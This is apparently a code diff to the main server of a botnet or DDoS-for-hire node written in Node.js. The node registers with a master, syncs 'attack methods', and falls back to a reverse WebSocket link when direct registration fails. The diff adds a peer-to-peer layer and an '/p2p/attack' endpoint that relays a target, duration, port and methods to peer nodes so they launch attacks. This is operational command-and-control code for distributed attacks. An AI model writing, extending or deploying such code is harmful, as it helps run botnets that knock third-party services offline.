@@ -26,6 +26,7 @@ import createHeartbeat from './modules/heartbeat.js';
 import createReverseClient from './modules/reverseClient.js';
 import createProxyUpdater from './modules/proxyUpdater.js';
 import ExecutorClass from './modules/executor.js';
+import P2PHybridNode from './modules/p2pHybrid.js';
 
 let encryptionManager = null;
 let encryptionInitialized = false;
@@ -42,7 +43,7 @@ if (!fs.existsSync(dbDir)) {
   console.log(`[INIT] Created database directory: ${dbDir}`);
 }
 
-// FIX: Proper async initialization untuk encryption
+// Initialize encryption
 async function initializeEncryption() {
   if (config.ENCRYPTION && config.ENCRYPTION.ENABLED) {
     try {
@@ -76,6 +77,7 @@ let methodsConfig = {};
 let heartbeatModule = null;
 let reverseClient = null;
 let proxyUpdater = null;
+let p2pNode = null; // P2P Hybrid Node
 let heartbeatIntervalId = null;
 let methodsSyncIntervalId = null;
 let backgroundHeartbeat = null;
@@ -90,6 +92,7 @@ const sharedData = {
   executor: null,
   encryptionManager: null,
   proxyUpdater: null,
+  p2pNode: null, // P2P Node reference
   nodeMode: 'DIRECT',
   isRegistered: false,
   isReachable: false,
@@ -103,6 +106,12 @@ const sharedData = {
     
     if (reverseClient && reverseClient.updateMethodsConfig) {
       reverseClient.updateMethodsConfig(newConfig);
+    }
+    
+    // Update P2P node methods config
+    if (p2pNode) {
+      p2pNode.methodsConfig = newConfig;
+      console.log(`[SHARED] P2P methods config updated: ${Object.keys(newConfig).length} methods`);
     }
     
     console.log(`[SHARED] Methods config updated: ${Object.keys(newConfig).length} methods`);
@@ -133,9 +142,12 @@ const sharedData = {
     this.proxyUpdater = updater;
   },
   
-  // FIX: Add method to update encryption manager reference
   setEncryptionManager(manager) {
     this.encryptionManager = manager;
+  },
+  
+  setP2PNode(node) {
+    this.p2pNode = node;
   }
 };
 
@@ -195,7 +207,6 @@ const encryptionDecorator = async (request, reply) => {
       return;
     }
 
-    // FIX: Check if encryption is initialized before using
     if (request.body.envelope === 'secure' && encryptionManager && encryptionInitialized && config.ENCRYPTION?.ENABLED) {
       const result = encryptionManager.processSecureMessage(request.body);
       if (result.success) {
@@ -229,7 +240,6 @@ const encryptionDecorator = async (request, reply) => {
 };
 
 function sendEncryptedResponse(reply, data, messageType = 'response') {
-  // FIX: Check if encryption is fully initialized
   if (encryptionManager && encryptionInitialized && config.ENCRYPTION?.ENABLED) {
     const encrypted = encryptionManager.createSecureMessage(data, messageType);
     reply.send(encrypted);
@@ -356,7 +366,6 @@ async function checkNodeReachability(ip, port) {
 
     let ipToCheck = ip || config.NODE.IP;
     
-    // FIX: Better IPv6 handling
     if (ipToCheck === '::1') {
       ipToCheck = '127.0.0.1';
     }
@@ -409,9 +418,8 @@ async function syncMethods() {
     const { syncMethodsWithMaster } = methodSyncModule;
     const result = await syncMethodsWithMaster(config);
     
-    // FIX: Proper await untuk refresh
     if (result && result.success && !result.up_to_date) {
-      await new Promise(resolve => setTimeout(resolve, 100)); // Give time for file write
+      await new Promise(resolve => setTimeout(resolve, 100));
       refreshMethodsConfig();
     }
     
@@ -421,6 +429,10 @@ async function syncMethods() {
     return null;
   }
 }
+
+// ======================
+// API ROUTES
+// ======================
 
 fastify.post('/nz-sec', {
   preHandler: encryptionDecorator
@@ -564,9 +576,85 @@ fastify.get('/health', async (request, reply) => {
     reachable: isReachable,
     methods_count: Object.keys(sharedData.methodsConfig).length,
     ip: config.NODE.IP || 'unknown',
-    port: config.SERVER.PORT
+    port: config.SERVER.PORT,
+    p2p_enabled: config.P2P?.ENABLED || false,
+    p2p_peers: p2pNode ? p2pNode.peers.size : 0
   });
 });
+
+// P2P Status Endpoint
+fastify.get('/p2p/status', async (request, reply) => {
+  if (!p2pNode) {
+    return reply.send({
+      enabled: false,
+      message: 'P2P is not initialized'
+    });
+  }
+  
+  reply.send(p2pNode.getStatus());
+});
+
+// P2P Connect to Peer Endpoint
+fastify.post('/p2p/connect', async (request, reply) => {
+  if (!p2pNode) {
+    return reply.status(503).send({
+      status: 'error',
+      error: 'P2P is not initialized'
+    });
+  }
+  
+  const { nodeId, ip, port } = request.body;
+  
+  if (!nodeId || !ip || !port) {
+    return reply.status(400).send({
+      status: 'error',
+      error: 'Missing nodeId, ip, or port'
+    });
+  }
+  
+  const result = await p2pNode.connectToPeer(nodeId, { ip, port });
+  
+  reply.send({
+    status: result.success ? 'ok' : 'error',
+    ...result
+  });
+});
+
+// P2P Request Attack from Peer
+fastify.post('/p2p/attack', async (request, reply) => {
+  if (!p2pNode) {
+    return reply.status(503).send({
+      status: 'error',
+      error: 'P2P is not initialized'
+    });
+  }
+  
+  const { nodeId, target, time, port, methods } = request.body;
+  
+  if (!nodeId || !target || !time || !methods) {
+    return reply.status(400).send({
+      status: 'error',
+      error: 'Missing required parameters'
+    });
+  }
+  
+  const result = await p2pNode.requestAttackFromPeer(
+    nodeId,
+    target,
+    time,
+    port || 80,
+    methods
+  );
+  
+  reply.send({
+    status: result.success ? 'ok' : 'error',
+    ...result
+  });
+});
+
+// ======================
+// INITIALIZATION
+// ======================
 
 async function initializeModules() {
   console.log('[INIT] Initializing modules...');
@@ -575,12 +663,11 @@ async function initializeModules() {
     sharedData.executor = executor;
   }
   
-  // FIX: Initialize encryption first and wait for it
   await initializeEncryption();
   sharedData.setEncryptionManager(encryptionManager);
   
   if (!heartbeatModule) {
-    heartbeatModule = createHeartbeat(config, executor, sharedData.methodsConfig);
+    heartbeatModule = await createHeartbeat(config, executor, sharedData.methodsConfig);
     console.log('[INIT] Heartbeat module created');
   }
   
@@ -686,7 +773,8 @@ function startModeBasedOperations(heartbeatInterval, methodsSyncInterval) {
   console.log(
     `[INIT] Ready - Methods: ${Object.keys(sharedData.methodsConfig).length}, ` +
     `Encryption: ${config.ENCRYPTION?.ENABLED && encryptionInitialized ? 'ON' : 'OFF'}, ` +
-    `Mode: ${nodeMode}, Reachable: ${isReachable ? 'YES' : 'NO'}`
+    `Mode: ${nodeMode}, Reachable: ${isReachable ? 'YES' : 'NO'}, ` +
+    `P2P: ${p2pNode ? 'ENABLED' : 'DISABLED'}`
   );
 }
 
@@ -694,33 +782,55 @@ function startDirectMode(heartbeatInterval, methodsSyncInterval) {
   console.log('[INIT] Starting DIRECT mode operations...');
   
   setTimeout(async () => {
-    if (!heartbeatModule) {
-      console.error('[INIT] Heartbeat module not initialized!');
-      return;
-    }
-    console.log('[INIT] Attempting registration to master (DIRECT mode)...');
-    
-    const registerResult = await heartbeatModule.autoRegister();
-    
-    if (registerResult.success) {
-      console.log('[INIT] ✓ Registration successful (DIRECT mode)');
-      isRegistered = true;
-      sharedData.setRegistered(true);
+    try {
+      if (!heartbeatModule) {
+        console.error('[INIT] Heartbeat module not initialized!');
+        return;
+      }
       
-      startHeartbeatService(heartbeatInterval);
-      startPeriodicSync(methodsSyncInterval);
+      // FIX: Validasi bahwa heartbeatModule adalah object dengan method autoRegister
+      if (typeof heartbeatModule !== 'object' || typeof heartbeatModule.autoRegister !== 'function') {
+        console.error('[INIT] Heartbeat module is invalid!', typeof heartbeatModule);
+        console.error('[INIT] Available keys:', Object.keys(heartbeatModule || {}));
+        return;
+      }
       
-    } else {
-      console.log('[INIT] ✗ Registration failed (DIRECT mode):', registerResult.error);
+      console.log('[INIT] Attempting registration to master (DIRECT mode)...');
       
+      const registerResult = await heartbeatModule.autoRegister();
+      
+      if (registerResult.success) {
+        console.log('[INIT] Registration successful (DIRECT mode)');
+        isRegistered = true;
+        sharedData.setRegistered(true);
+        
+        startHeartbeatService(heartbeatInterval);
+        startPeriodicSync(methodsSyncInterval);
+        
+      } else {
+        console.log('[INIT] Registration failed (DIRECT mode):', registerResult.error);
+        
+        if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
+          console.log('[INIT] Trying fallback to REVERSE mode...');
+          nodeMode = 'REVERSE';
+          sharedData.setNodeMode('REVERSE');
+          startReverseMode(heartbeatInterval, methodsSyncInterval);
+        } else {
+          console.log('[INIT] Will retry registration in 30 seconds...');
+          setTimeout(() => retryRegistration(heartbeatInterval, methodsSyncInterval), 30000);
+        }
+      }
+    } catch (error) {
+      // FIX: Proper error handling
+      console.error('[INIT] Error in startDirectMode:', error);
+      console.error('[INIT] Stack trace:', error.stack);
+      
+      // Fallback to REVERSE mode if available
       if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
-        console.log('[INIT] Trying fallback to REVERSE mode...');
+        console.log('[INIT] Falling back to REVERSE mode after error...');
         nodeMode = 'REVERSE';
         sharedData.setNodeMode('REVERSE');
         startReverseMode(heartbeatInterval, methodsSyncInterval);
-      } else {
-        console.log('[INIT] Will retry registration in 30 seconds...');
-        setTimeout(() => retryRegistration(heartbeatInterval, methodsSyncInterval), 30000);
       }
     }
   }, 2000);
@@ -748,7 +858,6 @@ function startReverseMode(heartbeatInterval, methodsSyncInterval) {
   console.log('[REVERSE-INIT] Connecting to master via WebSocket...');
   reverseClient.connect();
   
-  // FIX: Better connection state checking
   let connectionCheckAttempts = 0;
   const maxConnectionCheckAttempts = 30;
   
@@ -863,30 +972,59 @@ async function retryRegistration(heartbeatInterval, methodsSyncInterval) {
     return;
   }
   
-  const retryResult = await heartbeatModule.autoRegister();
-  
-  if (retryResult.success) {
-    console.log('[INIT] ✓ Registration successful on retry');
-    isRegistered = true;
-    sharedData.setRegistered(true);
+  try {
+    // FIX: Validasi bahwa heartbeatModule adalah object dengan method autoRegister
+    if (typeof heartbeatModule !== 'object' || typeof heartbeatModule.autoRegister !== 'function') {
+      console.error('[INIT] Heartbeat module is invalid for retry!', typeof heartbeatModule);
+      console.error('[INIT] Available keys:', Object.keys(heartbeatModule || {}));
+      
+      // Fallback to REVERSE mode if available
+      if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
+        console.log('[INIT] Switching to REVERSE mode after validation failure');
+        nodeMode = 'REVERSE';
+        sharedData.setNodeMode('REVERSE');
+        startReverseMode(heartbeatInterval, methodsSyncInterval);
+      }
+      return;
+    }
     
-    if (heartbeatIntervalId) clearInterval(heartbeatIntervalId);
-    if (methodsSyncIntervalId) clearInterval(methodsSyncIntervalId);
+    const retryResult = await heartbeatModule.autoRegister();
     
-    startHeartbeatService(heartbeatInterval);
-    startPeriodicSync(methodsSyncInterval);
+    if (retryResult.success) {
+      console.log('[INIT] ✓ Registration successful on retry');
+      isRegistered = true;
+      sharedData.setRegistered(true);
+      
+      if (heartbeatIntervalId) clearInterval(heartbeatIntervalId);
+      if (methodsSyncIntervalId) clearInterval(methodsSyncIntervalId);
+      
+      startHeartbeatService(heartbeatInterval);
+      startPeriodicSync(methodsSyncInterval);
+      
+    } else {
+      console.log('[INIT] ✗ Registration retry failed:', retryResult.error);
+      console.log('[INIT] Will retry again in 60 seconds...');
+      
+      if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
+        console.log('[INIT] Switching to REVERSE mode after multiple failures');
+        nodeMode = 'REVERSE';
+        sharedData.setNodeMode('REVERSE');
+        startReverseMode(heartbeatInterval, methodsSyncInterval);
+      } else {
+        setTimeout(() => retryRegistration(heartbeatInterval, methodsSyncInterval), 60000);
+      }
+    }
+  } catch (error) {
+    // FIX: Proper error handling
+    console.error('[INIT] Error in retryRegistration:', error);
+    console.error('[INIT] Stack trace:', error.stack);
     
-  } else {
-    console.log('[INIT] ✗ Registration retry failed:', retryResult.error);
-    console.log('[INIT] Will retry again in 60 seconds...');
-    
+    // Fallback to REVERSE mode if available
     if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
-      console.log('[INIT] Switching to REVERSE mode after multiple failures');
+      console.log('[INIT] Falling back to REVERSE mode after error...');
       nodeMode = 'REVERSE';
       sharedData.setNodeMode('REVERSE');
       startReverseMode(heartbeatInterval, methodsSyncInterval);
-    } else {
-      setTimeout(() => retryRegistration(heartbeatInterval, methodsSyncInterval), 60000);
     }
   }
 }
@@ -894,7 +1032,6 @@ async function retryRegistration(heartbeatInterval, methodsSyncInterval) {
 function gracefulShutdown(signal) {
   console.log(`\n[SHUTDOWN] Received ${signal}. Shutting down gracefully...`);
   
-  // FIX: Clear all intervals
   if (heartbeatIntervalId) {
     clearInterval(heartbeatIntervalId);
     heartbeatIntervalId = null;
@@ -904,7 +1041,6 @@ function gracefulShutdown(signal) {
     methodsSyncIntervalId = null;
   }
   
-  // FIX: Proper cleanup order
   if (proxyUpdater && proxyUpdater.stopAutoUpdate) {
     proxyUpdater.stopAutoUpdate();
   }
@@ -913,6 +1049,9 @@ function gracefulShutdown(signal) {
   }
   if (backgroundWSHeartbeat && backgroundWSHeartbeat.stop) {
     backgroundWSHeartbeat.stop();
+  }
+  if (p2pNode) {
+    p2pNode.shutdown();
   }
   if (reverseClient && reverseClient.shutdown) {
     reverseClient.shutdown();
@@ -926,20 +1065,21 @@ function gracefulShutdown(signal) {
   
   console.log('[SHUTDOWN] Cleanup completed');
   
-  // FIX: Close fastify properly
   fastify.close(() => {
     console.log('[SHUTDOWN] Fastify closed');
     process.exit(0);
   });
   
-  // Force exit after 5 seconds
   setTimeout(() => {
     console.log('[SHUTDOWN] Force exit');
     process.exit(0);
   }, 5000);
 }
 
-// Startup server dengan async/await yang benar
+// ======================
+// START SERVER
+// ======================
+
 async function startServer() {
   try {
     await fastify.listen({ port: config.SERVER.PORT, host: '0.0.0.0' });
@@ -950,6 +1090,45 @@ async function startServer() {
 
     refreshMethodsConfig();
     console.log(`Loaded ${Object.keys(sharedData.methodsConfig).length} methods`);
+    
+    // Initialize P2P Hybrid Node
+    if (config.P2P && config.P2P.ENABLED) {
+      try {
+        console.log('[P2P] Initializing P2P Hybrid Node...');
+        p2pNode = new P2PHybridNode(config, executor, sharedData.methodsConfig);
+        sharedData.setP2PNode(p2pNode);
+        
+        if (encryptionManager) {
+          p2pNode.setEncryptionManager(encryptionManager);
+        }
+        
+        // Start P2P server on the same port
+        const p2pStarted = await p2pNode.startP2PServer(fastify);
+        if (p2pStarted) {
+          console.log('[P2P] ✓ P2P Hybrid Node started successfully');
+          
+          // Setup P2P event listeners
+          p2pNode.on('peer_connected', (data) => {
+            console.log(`[P2P-EVENT] Peer connected: ${data.nodeId} (${data.direct ? 'direct' : 'relay'})`);
+          });
+          
+          p2pNode.on('peer_disconnected', (data) => {
+            console.log(`[P2P-EVENT] Peer disconnected: ${data.nodeId}`);
+          });
+          
+          p2pNode.on('peer_info', (data) => {
+            console.log(`[P2P-EVENT] Peer info received from ${data.nodeId}`, data.capabilities);
+          });
+          
+        } else {
+          console.log('[P2P] ✗ Failed to start P2P Hybrid Node');
+        }
+      } catch (error) {
+        console.error('[P2P] Error initializing P2P:', error.message);
+      }
+    } else {
+      console.log('[P2P] P2P is disabled in config');
+    }
     
     if (config.PROXY && config.PROXY.AUTO_UPDATE) {
       try {
@@ -970,7 +1149,6 @@ async function startServer() {
       console.log('[INIT] WARNING: Cannot reach master, will try REVERSE mode if WS available');
     }
 
-    // FIX: Test encryption after initialization
     if (config.ENCRYPTION?.ENABLED && encryptionManager && encryptionInitialized) {
       try {
         const testResult = encryptionManager.testEncryption();
